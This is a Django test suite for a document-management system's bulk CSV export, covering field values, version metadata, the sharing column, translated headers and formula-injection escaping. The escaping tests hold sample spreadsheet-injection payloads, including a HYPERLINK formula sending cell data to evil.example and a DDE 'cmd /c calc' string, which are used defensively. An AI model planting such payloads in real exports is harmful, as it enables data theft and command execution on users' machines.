import csv
import io
import shutil
from collections.abc import Sequence
from datetime import date

from django.contrib.auth.models import User
from django.test import TestCase
from django.utils.functional import Promise
from django.utils.translation import override as translation_override
from django.utils.translation import trans_real
from guardian.shortcuts import assign_perm

from documents.bulk_export import FIELD_LABELS
from documents.bulk_export import STANDARD_FIELDS
from documents.bulk_export import ExportDocument
from documents.bulk_export import _format_date
from documents.bulk_export import _get_field_value
from documents.bulk_export import build_export_field_list
from documents.bulk_export import custom_field_column_id
from documents.bulk_export import custom_field_ids_from_fields
from documents.bulk_export import get_csv_headers
from documents.bulk_export import get_custom_field_names
from documents.bulk_export import requires_latest_version
from documents.bulk_export import sanitize_csv_value
from documents.bulk_export import write_documents_csv
from documents.models import Correspondent
from documents.models import CustomField
from documents.models import CustomFieldInstance
from documents.models import Document
from documents.models import DocumentType
from documents.models import Note
from documents.models import StoragePath
from documents.models import Tag
from documents.permissions import get_shared_object_pks
from documents.tests.utils import DirectoriesMixin
from documents.tests.utils import SampleDirMixin


def render_csv(
    documents: Sequence[ExportDocument],
    fields: Sequence[str],
    *,
    user: User | None = None,
) -> list[list[str]]:
    buffer = io.StringIO()
    write_documents_csv(buffer, documents, fields, user=user)
    return list(csv.reader(io.StringIO(buffer.getvalue())))


class TestBulkExport(DirectoriesMixin, SampleDirMixin, TestCase):
    def setUp(self) -> None:
        super().setUp()

        self.owner = User.objects.create_user(username="owner")
        self.other_user = User.objects.create_user(username="other")
        self.correspondent = Correspondent.objects.create(name="ACME Corp")
        self.document_type = DocumentType.objects.create(name="Invoice")
        self.storage_path = StoragePath.objects.create(
            name="Default",
            path="{title}",
        )
        self.tag = Tag.objects.create(name="important")
        self.custom_field = CustomField.objects.create(
            name="Reference",
            data_type=CustomField.FieldDataType.STRING,
        )
        self.empty_custom_field = CustomField.objects.create(
            name="Optional",
            data_type=CustomField.FieldDataType.STRING,
        )

        self.document = Document.objects.create(
            title="Invoice 1",
            checksum="A",
            mime_type="application/pdf",
            content="OCR text",
            created=date(2024, 1, 15),
            original_filename="invoice1.pdf",
            correspondent=self.correspondent,
            document_type=self.document_type,
            storage_path=self.storage_path,
            owner=self.owner,
            archive_serial_number=42,
            page_count=3,
            archive_filename="archive.pdf",
            archive_checksum="ARCHIVE",
        )
        self.document.tags.add(self.tag)
        assert self.document.archive_path is not None
        shutil.copy(self.SAMPLE_DIR / "test_with_bom.pdf", self.document.archive_path)

        CustomFieldInstance.objects.create(
            document=self.document,
            field=self.custom_field,
            value_text="REF-001",
        )
        CustomFieldInstance.objects.create(
            document=self.document,
            field=self.empty_custom_field,
        )
        Note.objects.create(
            document=self.document,
            note="A note",
            user=self.owner,
        )
        assign_perm("view_document", self.other_user, self.document)

        self.entry = ExportDocument(root=self.document, file_doc=self.document)

    def test_helper_functions(self) -> None:
        self.assertEqual(custom_field_column_id(5), "custom_field_5")
        self.assertEqual(
            build_export_field_list(["title"], [1, 2]),
            ["title", "custom_field_1", "custom_field_2"],
        )
        self.assertEqual(
            custom_field_ids_from_fields(["title", "custom_field_1", "custom_field_7"]),
            [1, 7],
        )
        self.assertEqual(get_custom_field_names([]), {})
        self.assertEqual(
            get_custom_field_names([self.custom_field.id]),
            {self.custom_field.id: "Reference"},
        )
        self.assertEqual(
            get_csv_headers(["title", custom_field_column_id(999)], {}),
            ["Title", "custom_field_999"],
        )
        self.assertEqual(_format_date(None), "")

    def test_requires_latest_version_only_for_file_fields(self) -> None:
        self.assertFalse(requires_latest_version(["title", "tag", "custom_field_1"]))
        for field in (
            "content",
            "mime_type",
            "pagecount",
            "filename",
            "archived_filename",
        ):
            with self.subTest(field=field):
                self.assertTrue(requires_latest_version(["title", field]))

    def test_all_standard_fields_render(self) -> None:
        for field in STANDARD_FIELDS:
            with self.subTest(field=field):
                self.assertIsInstance(
                    _get_field_value(self.entry, field, user=self.owner),
                    str,
                )

        self.assertEqual(_get_field_value(self.entry, "id"), str(self.document.id))
        self.assertEqual(_get_field_value(self.entry, "title"), "Invoice 1")
        self.assertEqual(_get_field_value(self.entry, "created"), "2024-01-15")
        self.assertTrue(_get_field_value(self.entry, "added"))
        self.assertTrue(_get_field_value(self.entry, "modified"))
        self.assertEqual(_get_field_value(self.entry, "tag"), "important")
        self.assertEqual(_get_field_value(self.entry, "correspondent"), "ACME Corp")
        self.assertEqual(_get_field_value(self.entry, "documenttype"), "Invoice")
        self.assertEqual(_get_field_value(self.entry, "storagepath"), "Default")
        self.assertEqual(_get_field_value(self.entry, "owner"), "owner")
        self.assertEqual(_get_field_value(self.entry, "asn"), "42")
        self.assertEqual(_get_field_value(self.entry, "pagecount"), "3")
        self.assertEqual(_get_field_value(self.entry, "mime_type"), "application/pdf")
        self.assertEqual(_get_field_value(self.entry, "filename"), "invoice1.pdf")
        self.assertTrue(_get_field_value(self.entry, "archived_filename"))
        self.assertEqual(_get_field_value(self.entry, "content"), "OCR text")
        self.assertEqual(_get_field_value(self.entry, "unknown_field"), "")

    def test_metadata_comes_from_root_and_file_fields_from_the_version(self) -> None:
        """
        Version records do not carry the root's metadata, so mixing the two up
        silently exports blank or stale values.
        """
        version = Document.objects.create(
            title="stale copy of the title",
            checksum="B",
            mime_type="image/png",
            content="version OCR text",
            original_filename="invoice1-v2.png",
            page_count=9,
            root_document=self.document,
        )
        entry = ExportDocument(root=self.document, file_doc=version)

        self.assertEqual(_get_field_value(entry, "id"), str(self.document.id))
        self.assertEqual(_get_field_value(entry, "title"), "Invoice 1")
        self.assertEqual(_get_field_value(entry, "correspondent"), "ACME Corp")
        self.assertEqual(_get_field_value(entry, "documenttype"), "Invoice")
        self.assertEqual(_get_field_value(entry, "storagepath"), "Default")
        self.assertEqual(_get_field_value(entry, "tag"), "important")
        self.assertEqual(_get_field_value(entry, "owner"), "owner")
        self.assertEqual(_get_field_value(entry, "asn"), "42")
        self.assertEqual(_get_field_value(entry, "note"), "1")

        self.assertEqual(_get_field_value(entry, "content"), "version OCR text")
        self.assertEqual(_get_field_value(entry, "mime_type"), "image/png")
        self.assertEqual(_get_field_value(entry, "pagecount"), "9")
        self.assertEqual(_get_field_value(entry, "filename"), "invoice1-v2.png")
        self.assertEqual(_get_field_value(entry, "archived_filename"), "")

    def test_shared_column(self) -> None:
        self.assertEqual(
            _get_field_value(
                self.entry,
                "shared",
                user=self.owner,
                shared_object_pks={self.document.id},
            ),
            "Yes",
        )
        self.assertEqual(
            _get_field_value(
                self.entry,
                "shared",
                user=self.owner,
                shared_object_pks=set(),
            ),
            "No",
        )
        # Sharing is only reported to the owner doing the sharing.
        self.assertEqual(
            _get_field_value(
                self.entry,
                "shared",
                user=self.other_user,
                shared_object_pks={self.document.id},
            ),
            "No",
        )
        self.assertEqual(_get_field_value(self.entry, "shared", user=None), "")

    def test_shared_lookup_accepts_one_shot_iterables(self) -> None:
        self.assertEqual(
            get_shared_object_pks(document for document in [self.document]),
            {self.document.id},
        )

    def test_shared_column_is_resolved_against_the_root_document(self) -> None:
        version = Document.objects.create(
            title="v1",
            checksum="B",
            mime_type="application/pdf",
            root_document=self.document,
        )
        rows = render_csv(
            [ExportDocument(root=self.document, file_doc=version)],
            ["shared"],
            user=self.other_user,
        )
        # other_user holds an explicit view_document grant on the root
        self.assertEqual(rows[1], ["No"])

        self.document.owner = self.other_user
        self.document.save()
        rows = render_csv(
            [ExportDocument(root=self.document, file_doc=version)],
            ["shared"],
            user=self.other_user,
        )
        self.assertEqual(rows[1], ["Yes"])

    def test_note_count_prefers_the_annotation(self) -> None:
        annotated = Document.objects.filter(pk=self.document.pk).get()
        annotated.notes_count = 7
        entry = ExportDocument(root=annotated, file_doc=annotated)
        self.assertEqual(_get_field_value(entry, "note"), "7")

        # ...and still works on an unannotated instance
        self.assertEqual(_get_field_value(self.entry, "note"), "1")

    def test_optional_values_render_empty(self) -> None:
        plain = Document.objects.create(
            title="Plain",
            checksum="B",
            mime_type="application/pdf",
        )
        rows = render_csv(
            [ExportDocument(root=plain, file_doc=plain)],
            [
                "archived_filename",
                "asn",
                "pagecount",
                "owner",
                "correspondent",
                "documenttype",
                "storagepath",
                "tag",
                "content",
                custom_field_column_id(self.custom_field.id),
            ],
        )
        self.assertEqual(rows[1], [""] * 10)

    def test_csv_contains_header_and_one_row_per_document(self) -> None:
        fields = build_export_field_list(
            sorted(STANDARD_FIELDS),
            [self.custom_field.id, self.empty_custom_field.id],
        )
        rows = render_csv([self.entry], fields, user=self.owner)

        self.assertEqual(len(rows), 2)
        self.assertEqual(len(rows[0]), len(fields))
        self.assertIn("Reference", rows[0])
        self.assertIn("Optional", rows[0])
        self.assertIn("REF-001", rows[1])

    def test_formula_prefixes_are_neutralized(self) -> None:
        """
        Spreadsheet applications evaluate cells starting with a formula prefix
        regardless of CSV quoting, so those values must be escaped explicitly.
        """
        for dangerous in ("=1+1", "+1", "-1", "@SUM(A1)", "\tcmd", "\rcmd"):
            with self.subTest(value=dangerous):
                self.assertEqual(sanitize_csv_value(dangerous), "'" + dangerous)

        self.assertEqual(sanitize_csv_value(""), "")
        self.assertEqual(sanitize_csv_value("Invoice 1"), "Invoice 1")

    def test_attacker_controlled_values_are_escaped_in_the_output(self) -> None:
        evil = '=HYPERLINK("http://evil.example/?d="&A1,"Click")'
        evil_field = CustomField.objects.create(
            name="=cmd|'/c calc'!A1",
            data_type=CustomField.FieldDataType.STRING,
        )
        document = Document.objects.create(
            title=evil,
            checksum="EVIL",
            mime_type="application/pdf",
            content="@import",
            original_filename="-rf.pdf",
        )
        document.tags.add(Tag.objects.create(name="+tag"))
        CustomFieldInstance.objects.create(
            document=document,
            field=evil_field,
            value_text=evil,
        )

        rows = render_csv(
            [ExportDocument(root=document, file_doc=document)],
            build_export_field_list(
                ["title", "tag", "content", "filename"],
                [evil_field.id],
            ),
        )

        self.assertEqual(rows[0][-1], "'=cmd|'/c calc'!A1")
        self.assertEqual(rows[1][0], "'" + evil)
        self.assertEqual(rows[1][1], "'+tag")
        self.assertEqual(rows[1][2], "'@import")
        self.assertEqual(rows[1][3], "'-rf.pdf")
        self.assertEqual(rows[1][4], "'" + evil)

    def test_field_labels_are_lazily_translated(self) -> None:
        """
        Eager gettext() would freeze every header into whichever language was
        active when this module was first imported.
        """
        for field, label in FIELD_LABELS.items():
            with self.subTest(field=field):
                self.assertIsInstance(label, Promise)

    def test_headers_and_values_use_the_active_language(self) -> None:
        # The shipped .po files aren't compiled in test environments, so inject
        # the translations this test needs and discard the cache afterwards.
        self.addCleanup(trans_real._translations.clear)  # type: ignore[attr-defined]
        self.addCleanup(trans_real.deactivate_all)
        catalog = trans_real.translation("de-de")._catalog  # type: ignore[attr-defined]
        catalog["Title"] = "Überschrift"
        catalog["Yes"] = "Ja"

        with translation_override("de-de"):
            rows = render_csv(
                [self.entry],
                ["title", "shared"],
                user=self.owner,
            )
        self.assertEqual(rows[0], ["Überschrift", "Shared"])

        with translation_override("en-us"):
            rows = render_csv([self.entry], ["title"], user=self.owner)
        self.assertEqual(rows[0], ["Title"])
